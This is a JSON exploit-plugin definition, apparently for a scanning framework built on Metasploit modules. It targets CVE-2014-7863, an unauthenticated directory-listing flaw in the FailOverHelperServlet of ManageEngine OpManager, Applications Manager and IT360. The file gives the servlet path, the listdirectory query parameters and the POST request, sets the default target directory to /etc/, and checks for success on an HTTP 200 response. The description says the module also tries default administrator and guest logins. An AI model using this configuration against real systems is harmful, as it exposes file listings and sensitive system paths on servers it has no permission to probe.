{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "servlet,servlet?operation=listdirectory&rootDirectory=__ROOTDIRECTORY__&",
   "type" : "MSF",
   "detection" : {},
   "informations" : {
      "CVE" : "CVE-2014-7863",
      "DESCRIPTION" : "\n\n        This module exploits a directory listing information disclosure vulnerability in the\n\n        FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It\n\n        makes a recursive listing, so it will list the whole drive if you ask it to list / in\n\n        Linux or C:\\ in Windows. This vulnerability is unauthenticated on OpManager and\n\n        Applications Manager, but authenticated in IT360. This module will attempt to login\n\n        using the default credentials for the administrator and guest accounts; alternatively\n\n        you can provide a pre-authenticated cookie or a username / password combo. For IT360\n\n        targets enter the RPORT of the OpManager instance (usually 8300). This module has been\n\n        tested on both Windows and Linux with several different versions. Windows paths have to\n\n        be escaped with 4 backslashes on the command line. There is a companion module that\n\n        allows for arbitrary file download. This vulnerability has been fixed in Applications\n\n        Manager v11.9 b11912 and OpManager 11.6.\n\n      ",
      "name" : "ManageengineDirListing",
      "PAYLOAD" : "",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded",
               "Cookie" : ""
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
            "METHOD" : "POST"
         }
      },
      "OSVDB" : 117696,
      "VARIABLES" : {
         "TARGETURI" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "DIRECTORY" : {
            "VALUE" : "/etc/",
            "DESCRIPTION" : "Path of the directory to list"
         },
         "TIMESTAMP" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "ROOTDIRECTORY" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "MSF_MODULE" : "manageengine_dir_listing",
      "PATHS" : [
         "",
         "servlet,servlet",
         "servlet,servlet"
      ],
      "REFERENCES" : [
         "http://seclists.org/fulldisclosure/2015/Jan/114",
         "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt"
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "ALL",
      "METHOD" : "POST",
      "PATH" : "servlet,servlet?operation=listdirectory&rootDirectory=__ROOTDIRECTORY__&"
   },
   "description" : "\n\n        This module exploits a directory listing information disclosure vulnerability in the\n\n        FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It\n\n        makes a recursive listing, so it will list the whole drive if you ask it to list / in\n\n        Linux or C:\\ in Windows. This vulnerability is unauthenticated on OpManager and\n\n        Applications Manager, but authenticated in IT360. This module will attempt to login\n\n        using the default credentials for the administrator and guest accounts; alternatively\n\n        you can provide a pre-authenticated cookie or a username / password combo. For IT360\n\n        targets enter the RPORT of the OpManager instance (usually 8300). This module has been\n\n        tested on both Windows and Linux with several different versions. Windows paths have to\n\n        be escaped with 4 backslashes on the command line. There is a companion module that\n\n        allows for arbitrary file download. This vulnerability has been fixed in Applications\n\n        Manager v11.9 b11912 and OpManager 11.6.\n\n      ",
   "platform" : "ALL",
   "method" : "POST",
   "variables" : {
      "DIRECTORY" : {
         "VALUE" : "/etc/",
         "DESCRIPTION" : "Path of the directory to list"
      },
      "TARGETURI" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "TIMESTAMP" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "ROOTDIRECTORY" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "payload" : "",
   "msf_module" : "manageengine_dir_listing",
   "references" : [
      "http://seclists.org/fulldisclosure/2015/Jan/114",
      "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt"
   ],
   "cve" : "CVE-2014-7863",
   "name" : "ManageengineDirListing",
   "osvdb" : 117696,
   "paths" : [
      "",
      "servlet,servlet",
      "servlet,servlet"
   ],
   "requests" : {
      "EXPLOIT2" : {
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded",
            "Cookie" : ""
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
         "METHOD" : "POST"
      }
   }
}
